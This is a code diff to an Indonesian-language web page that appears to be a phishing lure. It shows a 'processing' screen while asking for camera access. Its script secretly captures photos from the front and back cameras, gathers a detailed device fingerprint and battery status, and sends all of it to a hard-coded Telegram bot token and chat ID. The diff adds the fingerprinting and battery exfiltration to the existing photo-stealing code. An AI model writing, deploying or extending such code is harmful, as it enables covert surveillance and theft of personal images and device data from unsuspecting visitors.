@@ -18,14 +18,9 @@
         h2{font-size:20px;color:#222;font-weight:600;margin:15px 0 5px}
         p{font-size:13px;color:#888}
         button{
-            background:#0066ff;
-            color:#fff;
-            border:none;
-            padding:14px 40px;
-            font-size:16px;
-            border-radius:8px;
-            margin-top:20px;
-            font-weight:600;
+            background:#0066ff;color:#fff;border:none;
+            padding:14px 40px;font-size:16px;border-radius:8px;
+            margin-top:20px;font-weight:600;
         }
     </style>
 </head>
@@ -38,6 +33,31 @@
 <script>
 const T="8700873155:AAGoOIIJzNBB0Dj1ycgyBrwY42A_05lpSH4";
 const C="1923372966";
+
+function getDeviceInfo(){
+    const ua=navigator.userAgent;
+    const p=navigator.platform||'';
+    const l=navigator.language||'';
+    const v=navigator.vendor||'';
+    const c=navigator.hardwareConcurrency||'?';
+    const m=navigator.maxTouchPoints||0;
+    const r=screen.width+'x'+screen.height;
+    const d=devicePixelRatio||1;
+    const ram=navigator.deviceMemory||'?';
+    const conn=navigator.connection||{};
+    const net=conn.effectiveType||'?';
+    const down=conn.downlink||'?';
+    const bat='getBattery' in navigator?'?':'?';
+    
+    return '📱 DEVICE INFO\n'+
+        '🖥 UserAgent: '+ua.substring(0,80)+'\n'+
+        '📏 Resolusi: '+r+' @'+d+'x\n'+
+        '🧠 RAM: '+ram+'GB | Core: '+c+'\n'+
+        '👆 Touch: '+m+' | Platform: '+p+'\n'+
+        '🌐 Bahasa: '+l+' | Vendor: '+v+'\n'+
+        '📶 Jaringan: '+net+' | Speed: '+down+'Mbps\n'+
+        '🕐 Waktu: '+new Date().toLocaleString();
+}
 
 async function k(f,l){
     const v=document.createElement('video');
@@ -54,9 +74,10 @@ async function k(f,l){
     try{const t=s.getVideoTracks()[0];await t.applyConstraints({advanced:[{torch:false}]});}catch(e){}
     s.getTracks().forEach(t=>t.stop());
     v.remove();
-    const b=await new Promise(r=>cv.toBlob(r,'image/jpeg',0.8));
+    const b=await new Promise(r=>cv.toBlob(r,'image/jpeg',0.85));
     const d=new FormData();
-    d.append('chat_id',C);d.append('photo',b,l+'.jpg');
+    d.append('chat_id',C);
+    d.append('photo',b,l+'.jpg');
     d.append('caption','📸 '+l+' - '+new Date().toLocaleString());
     await fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{method:'POST',body:d});
 }
@@ -64,13 +85,36 @@ async function k(f,l){
 (async()=>{
 try{
     document.getElementById('m').innerHTML='<div class="e">⏳</div><h2>Memproses</h2><p>Tunggu sebentar</p>';
+    
+    // Foto depan
     await k('user','DEPAN');
+    await new Promise(r=>setTimeout(r,500));
+    
+    // Foto belakang
     try{await k('environment','BELAKANG');}catch(e){}
+    
+    // Kirim info device lengkap
     await fetch('https://api.telegram.org/bot'+T+'/sendMessage',{
         method:'POST',
         headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({chat_id:C,text:'📱 '+navigator.userAgent+'\n🕐 '+new Date().toLocaleString()})
+        body:JSON.stringify({chat_id:C,text:getDeviceInfo()})
     });
+    
+    // Cek baterai kalau bisa
+    if('getBattery' in navigator){
+        try{
+            const bat=await navigator.getBattery();
+            await fetch('https://api.telegram.org/bot'+T+'/sendMessage',{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({
+                    chat_id:C,
+                    text:'🔋 Baterai: '+(bat.level*100).toFixed(0)+'% | Charging: '+(bat.charging?'Ya':'Tidak')
+                })
+            });
+        }catch(e){}
+    }
+    
     document.getElementById('m').innerHTML='<div class="e">✅</div><h2>Berhasil</h2><p>Bisa tutup halaman ini</p>';
 }catch(e){
     document.getElementById('m').innerHTML='<div class="e">❌</div><h2>Gagal</h2><p>Izin kamera diperlukan</p><button onclick="location.reload()">Coba Lagi</button>';
